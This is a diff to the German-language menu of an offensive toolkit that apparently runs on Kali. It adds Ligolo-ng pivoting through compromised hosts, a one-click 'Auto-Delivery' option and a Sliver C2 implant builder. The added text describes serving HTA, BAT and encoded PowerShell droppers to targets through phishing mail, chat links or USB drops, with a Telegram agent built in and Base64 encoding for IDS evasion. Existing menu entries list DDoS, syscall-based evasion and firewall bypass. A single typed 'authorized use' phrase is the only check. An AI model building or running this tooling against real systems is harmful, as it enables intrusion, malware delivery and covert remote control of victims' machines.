@@ -365,6 +365,7 @@ async def menu_network():
         menu_item(" 6", "💥  DDoS / Stress-Test",      "⛔", "Slowloris, HTTP Flood, hping3 SYN-Flood")
         menu_item(" 7", "🎯  Auto-Exploit Suggester",  "🔴", "nmap CVE → fertige Metasploit-Befehle")
         menu_item(" 8", "⚡  Quick Vuln Check",        "🔴", "EternalBlue/BlueKeep/Heartbleed in 60 Sek")
+        menu_item(" P", "🔀  Ligolo-ng Pivoting",      "⛔", "Tunnel durch kompromittiertes Ziel ins interne Netz")
         menu_item(" 0", "← Zurück", "")
 
         choice = prompt("network")
@@ -546,6 +547,63 @@ async def menu_network():
                 print(f"\n  {Y}[!] Gestoppt.{R}")
             except Exception as e:
                 print(f"  {RD}[!] {e}{R}")
+
+        elif choice in ("p", "P"):
+            banner()
+            section("🔀  LIGOLO-NG PIVOTING", "Tunnel ins interne Netz durch kompromittierten Host")
+            info_box([
+                "Ligolo-ng erstellt einen TUN-Tunnel von Kali durch den kompromittierten Host.",
+                "Danach kann Kali direkt IPs im internen Netz erreichen — kein SOCKS nötig.",
+                "",
+                "Ablauf:",
+                "  1. Ligolo installieren (Option 1)",
+                "  2. Proxy auf Kali starten (Option 2)",
+                "  3. Agent auf Ziel ausführen → Verbindung zum Proxy",
+                "  4. 'session' + 'start' in Ligolo-Konsole",
+                "  5. Route zum Zielnetz hinzufügen (Option 3)",
+                "  6. Kali kann jetzt direkt ins interne Netz scannen/exploiten",
+            ])
+            print()
+            menu_item(" 1", "📦  Ligolo-ng installieren",   "🟡", "Proxy + Agent Binaries laden")
+            menu_item(" 2", "🔌  Proxy starten",            "⛔", "Wartet auf Agent-Verbindung, zeigt Befehle")
+            menu_item(" 3", "🛣️   Route hinzufügen",         "🔴", "Subnet über ligolo-Interface routen")
+            menu_item(" 4", "📋  Cheatsheet",               "🟢", "Alle Ligolo-Befehle auf einen Blick")
+            print()
+            menu_item(" 0", "← Zurück", "")
+            print()
+
+            sub = prompt("ligolo")
+            if sub == "0":
+                continue
+
+            elif sub == "1":
+                print()
+                from tools.network.ligolo import LigoloInstall
+                await run_tool_live(LigoloInstall().run())
+
+            elif sub == "2":
+                print()
+                try:
+                    port = int(ask("Proxy-Port", "11601"))
+                except ValueError:
+                    port = 11601
+                try:
+                    from tools.network.ligolo import LigoloProxy
+                    await run_tool_live(LigoloProxy(listen_port=port).start())
+                except KeyboardInterrupt:
+                    print(f"\n  {Y}[*] Proxy gestoppt.{R}")
+
+            elif sub == "3":
+                subnet = ask("Subnet (z.B. 10.10.10.0/24)", required=True)
+                if subnet:
+                    from tools.network.ligolo import LigoloRouteManager
+                    await run_tool_live(LigoloRouteManager().add_route(subnet))
+
+            elif sub == "4":
+                print()
+                from tools.network.ligolo import get_cheatsheet
+                for line in get_cheatsheet():
+                    print(f"  {C}{line}{R}")
 
         wait_key()
 
@@ -1901,6 +1959,8 @@ async def menu_c2():
     menu_item(" 8", "🤖  Telegram Bot Setup",             "🔴", "Bot-Token verifizieren + Chat-ID herausfinden")
     menu_item(" 9", "🎣  Reverse Shell Listener",         "🔴", "Empfängt eingehende Shells (pwncat/nc/msf/socat)")
     menu_item(" W", "👁️   C2 Watcher (Offline-Detektor)", "🔴", "Antwortet 'Agent offline' wenn der Bot angeschrieben wird")
+    menu_item(" A", "🚀  Auto-Delivery",                  "⛔", "Ein-Klick: HTA+BAT+PS1 bauen + HTTP-Server starten")
+    menu_item(" L", "🐍  Sliver C2",                      "⛔", "Professionelles C2-Framework (BishopFox) — mTLS/HTTP/DNS")
     menu_item(" E", "🔮  Advanced Evasion Builder",       "⛔", "DLL Unhooking + Direct Syscalls + Sleep Obfuscation")
     menu_item(" D", "🌐  DNS C2 Tunneling",               "⛔", "C2 über DNS Port 53 — bypassed jede Firewall")
     menu_item(" S", "🔐  HTTPS Shell (Port 443)",         "⛔", "Sieht aus wie HTTPS — bypassed Firewalls + IDS")
@@ -2371,6 +2431,161 @@ async def menu_c2():
             print(f"\n  {Y}[*] Watcher gestoppt.{R}")
         except Exception as e:
             print(f"  {RD}[!] {e}{R}")
+        wait_key()
+
+    elif choice in ("a", "A"):
+        banner()
+        section("🚀  AUTO-DELIVERY", "Ein-Klick Angriffskette — HTA + BAT + PS1 + HTTP-Server")
+        info_box([
+            "Generiert alle Delivery-Formate und startet sofort einen HTTP-Server.",
+            "Du bekommst einen Link → den schickst du dem Ziel → Agent startet.",
+            "",
+            "Delivery-Formate:",
+            "  update.hta    → Doppelklick → läuft sofort (VBScript, kein PS-Dialog)",
+            "  update.bat    → für USB-Drops / freigegebene Ordner",
+            "  PS1 One-Liner → für Chat / Slack / Phishing-Mail",
+            "  Base64-kodiert → IDS-Evasion",
+            "",
+            "Kombination mit Phishing:",
+            "  Telegram-Agent wird eingebaut → nach Klick sofort online",
+        ])
+        print()
+
+        import socket as _sock
+        try:
+            local_ip = _sock.gethostbyname(_sock.gethostname())
+        except Exception:
+            local_ip = "192.168.x.x"
+
+        lhost = ask("LHOST (deine Kali IP)", local_ip)
+        if not lhost:
+            wait_key(); return
+        try:
+            port = int(ask("HTTP-Port", "8888"))
+        except ValueError:
+            port = 8888
+
+        from core.telegram_setup import load_telegram_config
+        token, chat_id = load_telegram_config()
+        if token and chat_id:
+            print(f"  {G}[*] Telegram Config gefunden — Agent wird eingebaut{R}")
+        else:
+            print(f"  {Y}[*] Kein Telegram Config — nur Delivery-Dateien ohne Agent{R}")
+
+        print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
+        if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
+            wait_key(); return
+
+        print()
+        try:
+            from tools.c2.auto_delivery import AutoDelivery
+            from core.config import load as cfg_load
+            cfg = cfg_load()
+            d = AutoDelivery(
+                lhost=lhost, port=port,
+                output_dir=cfg.get("output_dir", "/tmp"),
+                telegram_token=token, telegram_chat_id=chat_id,
+            )
+            await run_tool_live(d.start())
+        except KeyboardInterrupt:
+            print(f"\n  {Y}[*] Server gestoppt.{R}")
+        except Exception as e:
+            print(f"  {RD}[!] {e}{R}")
+        wait_key()
+
+    elif choice in ("l", "L"):
+        banner()
+        section("🐍  SLIVER C2", "Professionelles C2-Framework — BishopFox")
+        info_box([
+            "Sliver ist das modernste Open-Source C2-Framework (BishopFox/Sliver).",
+            "Industrie-Standard für Red Teams — ähnlich wie Cobalt Strike.",
+            "",
+            "Features:",
+            "  mTLS / HTTP / HTTPS / DNS / WireGuard Listener",
+            "  Session (interaktiv) + Beacon (periodisch) Implants",
+            "  Pivoting, Port-Forwarding, SOCKS5 built-in",
+            "  Armory: BOF, Extensions, Plugins",
+            "  Multiplayer: mehrere Operatoren gleichzeitig",
+            "",
+            "Unterschied zum Telegram C2:",
+            "  Telegram: einfach, Handy-Steuerung, kein Extra-Tool",
+            "  Sliver:   professionell, schnell, für ernste Engagements",
+        ])
+        print()
+        menu_item(" 1", "📦  Sliver installieren",         "🔴", "Lädt + installiert sliver-server (Go binary)")
+        menu_item(" 2", "🚀  Server-Daemon starten",       "🔴", "Sliver als Hintergrunddienst starten")
+        menu_item(" 3", "💉  Implant generieren",          "⛔", "Windows/Linux/macOS Payload (Session oder Beacon)")
+        menu_item(" 4", "📋  Cheatsheet",                  "🟢", "Alle Sliver-Befehle auf einen Blick")
+        print()
+        menu_item(" 0", "← Zurück", "")
+        print()
+
+        sub = prompt("sliver")
+        if sub == "0":
+            return
+
+        elif sub == "1":
+            print()
+            from tools.c2.sliver_engine import SliverInstall
+            await run_tool_live(SliverInstall().run())
+
+        elif sub == "2":
+            print()
+            from tools.c2.sliver_engine import SliverDaemon
+            await run_tool_live(SliverDaemon().start())
+
+        elif sub == "3":
+            print()
+            import socket as _sock
+            try:
+                local_ip = _sock.gethostbyname(_sock.gethostname())
+            except Exception:
+                local_ip = "192.168.x.x"
+
+            lhost = ask("LHOST (Kali IP)", local_ip)
+            if not lhost:
+                wait_key(); return
+
+            proto = ask("Protokoll [http/https/mtls/dns]", "http").lower()
+            try:
+                lport_def = {"http": "80", "https": "443", "mtls": "8888", "dns": "53"}.get(proto, "80")
+                lport = int(ask(f"Port", lport_def))
+            except ValueError:
+                lport = 80
+
+            beacon_str = ask("Beacon-Mode? [j/n]", "n").lower()
+            beacon = beacon_str in ("j", "ja", "y", "yes")
+            interval = 60
+            if beacon:
+                try:
+                    interval = int(ask("Beacon-Intervall in Sekunden", "60"))
+                except ValueError:
+                    interval = 60
+
+            os_str = ask("Ziel-OS [windows/linux/macos]", "windows").lower()
+            fmt = ask("Format [exe/dll/shellcode]", "exe").lower()
+
+            print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
+            if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
+                wait_key(); return
+
+            print()
+            from tools.c2.sliver_engine import SliverImplantBuilder
+            from core.config import load as cfg_load
+            cfg = cfg_load()
+            builder = SliverImplantBuilder(
+                lhost=lhost, lport=lport, protocol=proto,
+                target_os=os_str, fmt=fmt, output_dir=cfg.get("output_dir", "/tmp"),
+                beacon=beacon, beacon_interval=interval,
+            )
+            await run_tool_live(builder.build())
+
+        elif sub == "4":
+            print()
+            from tools.c2.sliver_engine import get_cheatsheet
+            for line in get_cheatsheet():
+                print(f"  {C}{line}{R}")
+
         wait_key()
 
     elif choice in ("e", "E"):
